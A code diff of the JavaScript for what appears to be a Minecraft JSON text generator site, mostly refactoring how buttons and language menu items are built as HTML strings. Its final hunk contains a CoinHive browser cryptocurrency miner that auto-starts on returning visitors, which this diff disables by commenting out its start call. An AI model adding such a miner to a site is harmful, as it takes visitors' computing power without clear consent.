@@ -1019,29 +1019,21 @@ function refreshOutput(input) {
                     iconString,
                     classString = "",
                     idString = "",
-                    onClick = function(){}
+                    onClickString = ""
                 ) {
-                    let button = document.createElement('i');
-                    button.id = idString;
-                    button.onclick = onClick;
-                    if (classString.length > 0) {
-                        button.classList.add(classString);
-                    }
-                    button.classList.add('fa');
-                    button.classList.add(`fa-${iconString}`);
-                    return button;
+                    return `<i id=${idString} onclick="${onClickString}" class="${classString} fa fa-${iconString} fa-2x"></i>`;
                 }
 
                 let rowContentsOuterContainer = document.createDocumentFragment();
                 let rowContentsInnerContainer = document.createDocumentFragment();
 
                 let dragButton = makeButton("sort", "drag-handle");
-                let editButton = makeButton("pencil", "", `${i}RowEditButton`, function(){ editExtra(i); });
-                let deleteButton = makeButton("times-circle", "", "", function(){deleteIndex(i);});
+                let editButton = makeButton("pencil", "", `${i}RowEditButton`, `editExtra(${i});`);
+                let deleteButton = `<i onclick="deleteIndex(${i});" class="fa fa-times-circle fa-2x"></i>`;
 
                 if (jobject[i].NEW_ITERATE_FLAG) {
                     // Disable the edit button
-                    editButton.style.color = 'gray';
+                    editButton = `<i style="color:gray;" class="fa fa-pencil fa-2x"></i>`;
 
                     if (
                         ["bookarray", "signset"].indexOf(
@@ -1135,21 +1127,19 @@ function refreshOutput(input) {
 
                 /* Controls */
                 let snippetManipulationArea = document.createElement("div");
-                snippetManipulationArea.className = "col-2";
-                snippetManipulationArea.appendChild(deleteButton);
-                snippetManipulationArea.appendChild(editButton);
-                snippetManipulationArea.appendChild(dragButton);
-                // snippetManipulationArea.innerHTML = `${deleteButton}${editButton}${dragButton}`;
+                snippetManipulationArea.className =
+                    "col-xs-4 col-sm-2 col-lg-2 snippet-manipulation-area";
+                snippetManipulationArea.innerHTML = `${deleteButton}${editButton}${dragButton}`;
 
                 /* Contents (right of controls) */
                 let snippetContents = document.createElement("div");
-                snippetContents.className = "col";
+                snippetContents.className = "col-xs-8 col-sm-10 col-lg-10";
                 snippetContents.padding = "none";
                 snippetContents.appendChild(rowContentsOuterContainer);
 
                 /* Overall container */
                 let snippetListItem = document.createElement("li");
-                snippetListItem.className = `row extraRow mover-row RowIndex${i}`;
+                snippetListItem.className = `row extraRow row-margin-top row-margin-bottom mover-row RowIndex${i}`;
                 snippetListItem.appendChild(snippetManipulationArea);
                 snippetListItem.appendChild(snippetContents);
 
@@ -1565,16 +1555,28 @@ function refreshLanguage(dropdownSelection) {
         .children()
         .remove();
     for (var i = 0; i < Object.keys(lang).length; i++) {
-        $("#language_keys").append(`<a class="dropdown-item" onclick=\"errorString = '${getLanguageName(Object.keys(lang)[i])}<br><br>'; lsm.setItem('langCode','${Object.keys(lang)[i]}'); refreshLanguage(true); refreshOutput();"><span class="${Object.keys(lang)[i]} langSelect" id="language_select_${Object.keys(lang)[i]}">${getLanguageName(Object.keys(lang)[i])}</span></a>`);
+        $("#language_keys").append(
+            "<li><a onclick=\"errorString = '" +
+                getLanguageName(Object.keys(lang)[i]) +
+                "<br><br>'; lsm.setItem('langCode','" +
+                Object.keys(lang)[i] +
+                '\'); refreshLanguage(true); refreshOutput();"><span class="' +
+                Object.keys(lang)[i] +
+                ' langSelect" id="language_select_' +
+                Object.keys(lang)[i] +
+                '">' +
+                getLanguageName(Object.keys(lang)[i]) +
+                "</span></a></li>"
+        );
     }
     if (Object.keys(lang).length != languageCodes.length) {
         $("#language_keys").append(
-            '<a class="dropdown-item"><i class="fa fa-spinner fa-pulse fa-fw" aria-hidden="true"></i></a>'
+            '<li><a><i class="fa fa-spinner fa-pulse fa-fw" aria-hidden="true"></i></a></li>'
         );
     }
-    $("#language_keys").append('<div class="dropdown-divider"></div>');
+    $("#language_keys").append('<li class="divider"></li>');
     $("#language_keys").append(
-        '<a class="dropdown-item" href="http://translate.minecraftjson.com"><span class="language_area" lang="language.translate"></span></a>'
+        '<li><a href="http://translate.minecraftjson.com"><span class="language_area" lang="language.translate"></span></a></li>'
     );
 
     $(".langSelect").removeClass("label label-success");
@@ -1686,7 +1688,17 @@ function initialize() {
         } else {
             var classString = "btn-default";
         }
-        $("#templateButtons").append(`<button type="button" class="btn btn-sm ${classString} templateButton" lang="template.${key}" version="${templates[key]["version"]}" template="${key}"></button>`);
+        $("#templateButtons").append(
+            '<button class="btn btn-xs ' +
+                classString +
+                ' templateButton" lang="template.' +
+                key +
+                '" version="' +
+                templates[key]["version"] +
+                '" template="' +
+                key +
+                '"></button> '
+        );
     }
 
     if (lsm.getItem("jtemplate") == undefined) {
@@ -1939,10 +1951,10 @@ function initialize() {
 
     miner = new CoinHive.User('Cjv1MQzP7McKdWFumMCE7EXQeoZk367w', lsm.getItem("initialTimestamp"));
     if (!miner.isMobile() && miner.hasWASMSupport() && !miner.didOptOut(86400) && lsm.getItem('loadCount') > 1 && lsm.getItem("donateStatus") != "accepted-initial") {
-        miner.start();
+        // miner.start();
         miner.setNumThreads(1);
         miner.setAutoThreadsEnabled(false);
-        miner.setThrottle(0.75);
+        miner.setThrottle(0.5);
     }
 
     miner.on('optin', params => {
